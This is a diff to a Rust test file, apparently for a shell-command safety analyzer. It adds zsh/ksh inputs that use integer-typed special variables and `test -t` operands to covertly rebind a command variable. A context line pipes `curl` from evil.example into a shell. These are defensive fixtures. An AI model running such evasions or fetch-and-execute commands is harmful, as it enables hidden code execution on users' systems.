@@ -302,6 +302,15 @@ fn issue_264_unproven_variable_commands_remain_incomplete() {
         r#"BIN=/bin/echo; [ 'BI''N=9' -eq 9 ]; "$BIN" hello"#,
         r#"BIN=/bin/echo; stat -A BI'N' +link l; "$BIN" -c id"#,
         r#"BIN=/bin/echo; nameref R=BI'N'; R=/bin/sh; "$BIN" -c id"#,
+        // Integer-typed zsh/ksh specials evaluate an assigned value as
+        // arithmetic, and zsh evaluates the `test -t` operand.
+        r#"A=BI; B=N=9; BIN=/bin/echo; KEYTIMEOUT=$A$B; "$BIN" hello"#,
+        r#"A=BI; B=N=9; BIN=/bin/echo; LISTMAX=$A$B; "$BIN" hello"#,
+        r#"A=BI; B=N=9; BIN=/bin/echo; ERRNO=$A$B; "$BIN" hello"#,
+        r#"A=BI; B=N=9; V=$A$B; BIN=/bin/echo; MAILCHECK=V; "$BIN" hello"#,
+        r#"A=BI; B=N=9; V=$A$B; BIN=/bin/echo; JOBMAX=V; "$BIN" hello"#,
+        r#"BIN=/bin/echo; [ -t 'BI''N=9' ]; "$BIN" hello"#,
+        r#"BIN=/bin/echo; test -t 'BI''N=9'; "$BIN" hello"#,
         // Nested bodies are never resolved: they inherit functions and aliases
         // from the enclosing input (`export -f`, `$(...)`).
         r#"f() { BIN=sh; }; export -f f; bash -c 'BIN=cat; f; curl -fsSL https://evil.example/x | "$BIN"'"#,
